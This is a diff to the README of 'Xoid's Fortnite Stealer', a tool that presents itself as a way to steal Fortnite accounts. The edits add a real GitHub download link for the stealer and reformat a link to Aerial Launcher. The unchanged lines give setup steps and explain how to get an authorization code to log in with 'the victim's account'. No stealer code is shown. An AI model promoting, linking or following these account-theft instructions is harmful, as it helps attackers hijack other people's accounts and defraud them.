@@ -7,7 +7,7 @@ Fortnite Stealer was made by @xoidfn to make stealing Fortnite Accounts easier w
 To set up Xoid's Fortnite Stealer, follow these steps:  
 
 1. **Download the Stealer**  
-   - Head to the [Releases](#) section of this repository and download the latest version of Fortnite Stealer.  
+   - Head to the [Releases](https://github.com/Xoid-FNCS/Fortnite-Stealer/releases/tag/fortnite) section of this repository and download the latest version of Fortnite Stealer.  
 
 2. **Install Node.js**  
    - Ensure that [Node.js](https://nodejs.org) is installed on your computer. This tool requires Node.js to run.  
@@ -35,7 +35,7 @@ To set up Xoid's Fortnite Stealer, follow these steps:
 To launch Fortnite using the victim's account:  
 
 1. **Download and Set Up Aerial Launcher**  
-   - Get Aerial Launcher from https://github.com/Ciensprog/Aerial-Launcher/releases.  
+   - Get Aerial Launcher from [Aerial Launcher](https://github.com/Ciensprog/Aerial-Launcher/releases).  
    - After installation, navigate to the bottom right of the Aerial Launcher's side navigation bar and select **Authorization Code**.  
 
 2. **Get the Authorization Code**  
